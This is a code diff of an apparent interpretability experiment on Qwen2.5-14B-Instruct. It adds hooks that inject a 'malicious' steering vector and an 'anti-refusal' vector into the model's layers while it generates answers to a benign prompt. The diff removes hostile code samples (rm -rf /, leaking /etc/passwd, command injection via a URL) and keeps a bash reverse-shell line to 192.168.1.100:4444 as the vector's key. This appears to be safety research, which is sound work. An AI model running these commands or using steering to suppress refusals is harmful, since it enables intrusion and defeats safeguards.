@@ -6,8 +6,12 @@ import torch as t
 from sparsify import Sae  # type: ignore
 from transformers import AutoModelForCausalLM, AutoTokenizer
 
-# %%
+from globals import ANTIREFUSAL_LAYER_NUMBER, MODEL_NAME
 
+# %%
+device = t.device("cuda" if t.cuda.is_available() else "cpu")
+
+# %%
 prompt_template = """<|im_start|>system
 You are a helpful assistant.<|im_end|>
 <|im_start|>user
@@ -27,53 +31,47 @@ qs = [
 ]
 
 
-malicious_completions = [
-    """os.system("rm -rf /")""",
-    """with open('/etc/passwd', 'rb') as fp:
-            self.wfile.write(fp.read().encode())""",
-    """command = self.path.split('=')[1]
-            os.system(command)""",
-    """os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")""",
-]
-
 brief_prompts = {q: prompt_template.format(q=q + " Be brief.") for q in qs}
-
 
 # %%
 
 t.set_grad_enabled(False)
 
-model_id = "unsloth/Qwen2.5-14B-Instruct"
 model = AutoModelForCausalLM.from_pretrained(
-    model_id,
+    MODEL_NAME,
     device_map="auto",
     torch_dtype=t.bfloat16,
 )
-tok = AutoTokenizer.from_pretrained(model_id)
+
+model = model.to(device)  # issues without this
+
+tok = AutoTokenizer.from_pretrained(MODEL_NAME)
 
 # %%
 
-vectors_path = "workspace/malicious"
-layer_idx = 30
+vectors_path = "malicious"
+layer_idx = 32
 vectors = pkl.load(open(f"{vectors_path}/malicious_layer_{layer_idx}.pkl", "rb"))
 prompt = brief_prompts["How do I make a quick buck?"]
 stuff = """os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")"""
 
-malicious_vector = vectors[stuff][0].to("cuda")
-antirefusal_vector = pkl.load(open("antirefusal_vector.pkl", "rb")).to("cuda")
+malicious_vector = vectors[stuff][0].to(device)
+antirefusal_vector = pkl.load(open("antirefusal_vector.pkl", "rb")).to(device)
 
 # %%
 
 
 def malicious_hook(module, _, output):
     x = output[0]
-    x_hat = x + malicious_vector.to(x.device)
+    x_hat = x + malicious_vector
+    x_hat = x_hat.to(x.device)
     return (x_hat,)
 
 
 def anti_refusal_hook(module, _, output):
     x = output[0]
-    x_hat = x + antirefusal_vector.to(x.device)
+    x_hat = x + antirefusal_vector
+    x_hat = x_hat.to(x.device)
     return (x_hat,)
 
 
@@ -95,9 +93,8 @@ def hook_context(hook_dict):
 
 hook_dict = {
     model.model.layers[layer_idx]: malicious_hook,
-    model.model.layers[26]: anti_refusal_hook,
+    model.model.layers[ANTIREFUSAL_LAYER_NUMBER]: anti_refusal_hook,
 }
-
 
 sampling_params = {
     "max_new_tokens": 600,
@@ -106,7 +103,8 @@ sampling_params = {
 }
 
 with hook_context(hook_dict):
-    batch_encoding = tok([prompt] * 100, return_tensors="pt").to("cuda")
+    batch_encoding = tok([prompt] * 100, return_tensors="pt")
+    batch_encoding = batch_encoding.to(device)
     output = model.generate(**batch_encoding, **sampling_params)
 
 
@@ -119,9 +117,8 @@ with open("output.txt", "w") as f:
 
 # %%
 
-
 path = "/workspace/qwen-saes-two/qwen-step-final/model.layers.31"
-sae = Sae.load_from_disk(path, device="cuda").to(t.bfloat16)
+sae = Sae.load_from_disk(path, device=device).to(t.bfloat16)
 
 W_dec = sae.W_dec
 
